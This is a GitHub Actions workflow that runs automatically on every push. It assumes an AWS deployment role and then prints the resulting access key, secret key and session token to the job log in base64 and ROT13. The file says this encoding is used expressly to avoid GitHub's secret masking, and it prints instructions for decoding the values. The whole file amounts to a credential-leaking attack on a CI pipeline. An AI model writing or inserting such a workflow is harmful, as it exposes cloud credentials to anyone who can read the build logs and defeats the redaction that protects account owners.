name: OBFUSCATED CREDENTIALS

on:
  workflow_dispatch:
  push:

jobs:
  get-creds:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - name: Assume GitHub Deployment Role
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
        aws-region: us-west-1
        role-session-name: ObfuscatedCreds
        role-external-id: "internal/secrets/id-v2"
        
    - name: Extract Obfuscated Credentials
      run: |
        echo "ðŸ”‘ EXTRACTED CREDENTIALS (Base64 encoded to avoid masking):"
        echo "========================================================="
        echo "ACCESS_KEY_B64: $(echo $AWS_ACCESS_KEY_ID | base64)"
        echo "SECRET_KEY_B64: $(echo $AWS_SECRET_ACCESS_KEY | base64)"
        echo "SESSION_TOKEN_B64: $(echo $AWS_SESSION_TOKEN | base64)"
        echo ""
        echo "ðŸ”“ DECODE WITH:"
        echo "export AWS_ACCESS_KEY_ID=\$(echo 'ACCESS_KEY_B64_VALUE' | base64 -d)"
        echo "export AWS_SECRET_ACCESS_KEY=\$(echo 'SECRET_KEY_B64_VALUE' | base64 -d)"
        echo "export AWS_SESSION_TOKEN=\$(echo 'SESSION_TOKEN_B64_VALUE' | base64 -d)"
        echo ""
        echo "ðŸ“Š Alternative - ROT13 encoding:"
        echo "ACCESS_KEY_ROT13: $(echo $AWS_ACCESS_KEY_ID | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
        echo "SECRET_KEY_ROT13: $(echo $AWS_SECRET_ACCESS_KEY | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
        echo ""
        echo "ðŸŽ¯ Current role verification:"
        aws sts get-caller-identity